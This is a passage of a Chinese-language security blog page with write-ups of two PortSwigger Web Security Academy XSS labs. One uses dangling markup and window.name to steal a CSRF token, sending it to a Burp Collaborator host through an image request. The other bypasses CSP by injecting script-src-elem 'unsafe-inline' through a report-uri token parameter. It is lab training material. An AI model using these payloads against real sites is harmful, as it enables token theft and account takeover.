+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">name</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&#x27;//uzx25ua3zzzar7j0b9mqbfs1csil6a.burpcollaborator.net?&#x27;</span>+<span class="built_in">encodeURIComponent</span>(<span class="variable language_">window</span>.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        location = <span class="string">&#x27;https://0a9200b003b6fd42c0d343d600c200fd.web-security-academy.net/email?email=%22%3E%3Ca%20href=%22https://exploit-0a4e00e903cffd99c04c43e201dd00d4.web-security-academy.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里没有明显传递window.name 但是这里用到了 <code>&lt;base target=xxx&gt; </code> 尝试一下发现 使用 <code>&lt;base target=xxx&gt; </code> 指定target跳转(a标签 或者location&#x3D; ),那么target的值会传给跳转后页面的window.name </p>
+<p>也就是这样的流程 首先我们 在我们的攻击者服务器上面托管上述代码 当受害者访问时 由于第一次 window.name 为空 因此直接定位到 有漏洞的网站 </p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221123212314092.png" alt="image-20221123212314092"></p>
+<p>接着受害者点击Click me </p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221123212328534.png" alt="image-20221123212328534"></p>
+<p>又会跳转回攻击者的服务器  而这次的跳转正如上面所说的是带有数据的 也就是在 window.name中 因此这时 if语句进入 加载了 image 页面 将数据带入到了 collaborator</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221123213108733.png" alt="image-20221123213108733"></p>
+<p>拿到数据</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221123213146888.png" alt="image-20221123213146888"></p>
+<p>成功拿到csrf 的值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ibsga6CqlfI4i2dVSY14boHMlR2Xasr4</span><br></pre></td></tr></table></figure>
+
+<p>修改email处抓包</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221123213259441.png" alt="image-20221123213259441"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221123213504506.png" alt="image-20221123213504506"></p>
+<p>修改两处值</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221123213730941.png" alt="image-20221123213730941"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221123213959040.png" alt="image-20221123213959040"></p>
+<h2 id="受-CSP-保护的反射型-XSS，绕过-CSP-29"><a href="#受-CSP-保护的反射型-XSS，绕过-CSP-29" class="headerlink" title="受 CSP 保护的反射型 XSS，绕过 CSP(29)"></a>受 CSP 保护的反射型 XSS，绕过 CSP(29)</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221123214436978.png" alt="image-20221123214436978"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221123214410585.png" alt="image-20221123214410585"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; object-src &#x27;none&#x27;;script-src &#x27;self&#x27;; style-src &#x27;self&#x27;; report-uri /csp-report?token=</span><br></pre></td></tr></table></figure>
+
+<p>这里有一个 report-uri &#x2F;csp-report?token&#x3D; 意思就是把token里的策略发布到对应站点(自定义策略),通过get传值即可,构造payload </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&lt;script&gt;alert(1)&lt;/script&gt;&amp;token=;script-src-elem &#x27;unsafe-inline&#x27; </span><br></pre></td></tr></table></figure>
+
+<p>-elem可以管理 script-src的规则,利用这个参数,可以重写规则</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221123215107985.png" alt="image-20221123215107985"></p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/burp/">burp</a><a class="post-meta__tags" href="/tags/xss/">xss</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.pixabay.com/photo/2018/01/12/14/24/night-3078326_1280.jpg" data-sites="qq,wechat,weibo,facebook,twitter"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-22-45.png" target="_blank"><img class="post-qr-code-img" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-22-45.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-32-45.png" target="_blank"><img class="post-qr-code-img" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-32-45.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/20e3649c.html"><img class="prev-cover" src="https://cdn.pixabay.com/photo/2016/04/20/19/47/wolves-1341881_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Cross-site request forgery</div></div></a></div><div class="next-post pull-right"><a href="/54410650.html"><img class="next-cover" src="https://cdn.pixabay.com/photo/2017/07/19/01/41/clouds-2517653_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Directory traversal</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/424af0ec.html" title="Access control vulnerabilities"><img class="cover" src="https://cdn.pixabay.com/photo/2018/06/09/17/25/trees-3464777_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-08</div><div class="title">Access control vulnerabilities</div></div></a></div><div><a href="/6da97099.html" title="Business logic vulnerabilities"><img class="cover" src="https://cdn.pixabay.com/photo/2016/10/22/17/46/mountains-1761292_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-08</div><div class="title">Business logic vulnerabilities</div></div></a></div><div><a href="/120e7910.html" title="Clickjacking"><img class="cover" src="https://cdn.pixabay.com/photo/2017/07/19/01/41/clouds-2517653_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-08</div><div class="title">Clickjacking</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS"><span class="toc-number">1.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84-1"><span class="toc-number">1.1.</span> <span class="toc-text">反射(1)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%82%A8-2"><span class="toc-number">1.2.</span> <span class="toc-text">存储(2)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dom-3"><span class="toc-number">1.3.</span> <span class="toc-text">dom(3)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#innerHTML-4"><span class="toc-number">1.4.</span> <span class="toc-text">innerHTML(4)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jQuery%E6%9F%A5%E6%89%BE%E9%94%9A%E5%85%83%E7%B4%A0-5"><span class="toc-number">1.5.</span> <span class="toc-text">jQuery查找锚元素(5)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%96%E6%8B%AC%E5%8F%B7%E7%9A%84-HTML-%E7%BC%96%E7%A0%81-6"><span class="toc-number">1.6.</span> <span class="toc-text">尖括号的 HTML 编码(6)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#href%E5%B8%A6%E6%9C%89%E5%8F%8C%E5%BC%95%E5%8F%B7-HTML-%E7%BC%96%E7%A0%81-7"><span class="toc-number">1.7.</span> <span class="toc-text">href带有双引号 HTML 编码(7)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#js%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5-8"><span class="toc-number">1.8.</span> <span class="toc-text">js代码注入(8)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#location-search-select-DOM-XSS-9"><span class="toc-number">1.9.</span> <span class="toc-text">location.search  select DOM XSS(9)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AngularJS-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%AD%E7%9A%84-DOM-XSS-10"><span class="toc-number">1.10.</span> <span class="toc-text">AngularJS 表达式中的 DOM XSS(10)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84-DOM-XSS-11"><span class="toc-number">1.11.</span> <span class="toc-text">反射 DOM XSS(11)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B-DOM-XSS-12"><span class="toc-number">1.12.</span> <span class="toc-text">存储型 DOM XSS(12)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%E7%AA%83%E5%8F%96-cookie-13"><span class="toc-number">1.13.</span> <span class="toc-text">利用跨站点脚本窃取 cookie(13)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%E6%8D%95%E8%8E%B7%E5%AF%86%E7%A0%81-14"><span class="toc-number">1.14.</span> <span class="toc-text">利用跨站点脚本捕获密码(14)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-XSS-%E6%89%A7%E8%A1%8C-CSRF-15"><span class="toc-number">1.15.</span> <span class="toc-text">利用 XSS 执行 CSRF(15)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E7%BB%95%E8%BF%87waf-16"><span class="toc-number">1.16.</span> <span class="toc-text">XSS绕过waf(16)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%87%E7%AD%BE-17"><span class="toc-number">1.17.</span> <span class="toc-text">XSS自定义标签(17)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SVG-%E6%A0%87%E8%AE%B0%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS-18"><span class="toc-number">1.18.</span> <span class="toc-text">SVG 标记的反射型 XSS(18)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E8%A7%84%E8%8C%83%E9%93%BE%E6%8E%A5%E6%A0%87%E7%AD%BE%E4%B8%AD%E5%8F%8D%E6%98%A0-XSS-19"><span class="toc-number">1.19.</span> <span class="toc-text">在规范链接标签中反映 XSS(19)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-%E5%8F%8D%E5%B0%84%E5%88%B0-JavaScript-%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%EF%BC%8C%E5%B9%B6%E8%BD%AC%E4%B9%89%E4%BA%86%E5%8D%95%E5%BC%95%E5%8F%B7%E5%92%8C%E5%8F%8D%E6%96%9C%E6%9D%A0-20"><span class="toc-number">1.20.</span> <span class="toc-text">XSS 反射到 JavaScript 字符串中，并转义了单引号和反斜杠(20)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%86-XSS-%E5%8F%8D%E5%B0%84%E5%88%B0%E5%B8%A6%E6%9C%89%E5%B0%96%E6%8B%AC%E5%8F%B7%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%9A%84-JavaScript-%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD-HTML-%E7%BC%96%E7%A0%81%E5%92%8C%E5%8D%95%E5%BC%95%E5%8F%B7%E8%BD%AC%E4%B9%89-21"><span class="toc-number">1.21.</span> <span class="toc-text">将 XSS 反射到带有尖括号和双引号的 JavaScript 字符串中 HTML 编码和单引号转义(21)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%B0%96%E6%8B%AC%E5%8F%B7%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%B0%86-XSS-%E5%AD%98%E5%82%A8%E5%88%B0onclick%E4%BA%8B%E4%BB%B6%E4%B8%AD-HTML-%E7%BC%96%E7%A0%81%E5%92%8C%E5%8D%95%E5%BC%95%E5%8F%B7%E5%92%8C%E5%8F%8D%E6%96%9C%E6%9D%A0%E8%BD%AC%E4%B9%89-22"><span class="toc-number">1.22.</span> <span class="toc-text">使用尖括号和双引号将 XSS 存储到onclick事件中 HTML 编码和单引号和反斜杠转义(22)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%86-XSS-%E5%8F%8D%E5%B0%84%E5%88%B0%E5%B8%A6%E6%9C%89%E5%B0%96%E6%8B%AC%E5%8F%B7%E3%80%81%E5%8D%95%E5%BC%95%E5%8F%B7%E3%80%81%E5%8F%8C%E5%BC%95%E5%8F%B7%E3%80%81%E5%8F%8D%E6%96%9C%E6%9D%A0%E5%92%8C%E5%8F%8D%E5%BC%95%E5%8F%B7%E7%9A%84%E6%A8%A1%E6%9D%BF%E6%96%87%E5%AD%97%E4%B8%AD-Unicode-%E8%BD%AC%E4%B9%89-23"><span class="toc-number">1.23.</span> <span class="toc-text">将 XSS 反射到带有尖括号、单引号、双引号、反斜杠和反引号的模板文字中 Unicode 转义(23)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F%E5%92%8Chref%E5%B1%9E%E6%80%A7%E8%A2%AB%E9%98%BB%E6%AD%A2%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS-24"><span class="toc-number">1.24.</span> <span class="toc-text">事件处理程序和href属性被阻止的反射型 XSS(24)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8-JavaScript-URL-%E4%B8%AD%E5%8F%8D%E6%98%A0%E4%BA%86-XSS%EF%BC%8C%E5%B9%B6%E9%98%BB%E6%AD%A2%E4%BA%86%E4%B8%80%E4%BA%9B%E5%AD%97%E7%AC%A6-25"><span class="toc-number">1.25.</span> <span class="toc-text">在 JavaScript URL 中反映了 XSS，并阻止了一些字符(25)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AngularJS-%E6%B2%99%E7%AE%B1%E8%BD%AC%E4%B9%89%E8%80%8C%E4%B8%8D%E4%BD%BF%E7%94%A8%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS-26"><span class="toc-number">1.26.</span> <span class="toc-text">AngularJS 沙箱转义而不使用字符串的反射型 XSS(26)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-AngularJS-%E6%B2%99%E7%AE%B1%E8%BD%AC%E4%B9%89%E5%92%8C-CSP-%E7%9A%84%E5%8F%8D%E5%B0%84-XSS-27"><span class="toc-number">1.27.</span> <span class="toc-text">使用 AngularJS 沙箱转义和 CSP 的反射 XSS(27)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP-%E4%BF%9D%E6%8A%A4%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS%EF%BC%8C%E5%B8%A6%E6%9C%89%E6%82%AC%E6%8C%82%E6%A0%87%E8%AE%B0%E6%94%BB%E5%87%BB-28"><span class="toc-number">1.28.</span> <span class="toc-text">CSP 保护的反射型 XSS，带有悬挂标记攻击(28)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%82%AC%E6%8C%82%E6%A0%87%E8%AE%B0%E6%94%BB%E5%87%BB"><span class="toc-number">1.28.1.</span> <span class="toc-text">悬挂标记攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#window-name%E8%B7%A8%E5%9F%9F"><span class="toc-number">1.28.2.</span> <span class="toc-text">window.name跨域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#js%E4%B8%AD%E5%87%A0%E7%A7%8D%E5%AE%9E%E7%94%A8%E7%9A%84%E8%B7%A8%E5%9F%9F%E6%96%B9%E6%B3%95%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.28.3.</span> <span class="toc-text">js中几种实用的跨域方法原理详解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%97-CSP-%E4%BF%9D%E6%8A%A4%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS%EF%BC%8C%E7%BB%95%E8%BF%87-CSP-29"><span class="toc-number">1.29.</span> <span class="toc-text">受 CSP 保护的反射型 XSS，绕过 CSP(29)</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background: linear-gradient(20deg, #0062be, #925696, #cc426e, #fb0347)"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2023 By wanan</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'RjFSSKpeg1lxuvDjmLndzaLO-MdYXbMMI',
+      appKey: '8qrAyIwMaJTebKjjzPnV0SFT',
+      avatar: 'monsterid',
+      serverURLs: 'https://valine.wanan.red',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'https://www.wanan.red/da9cf488.html'
+    this.page.identifier = '/da9cf488.html'
+    this.page.title = 'Cross-site scripting'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://www-wanan-red.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+
+  document.getElementById('darkmode').addEventListener('click', () => {
+    setTimeout(() => window.disqusReset(), 200)
+  })
+}
+
+if ('Valine' === 'Disqus' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script>(function(d, w, c) {
+    w.ChatraID = 'LAbfxFAsFCbvYgjHY';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (false) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
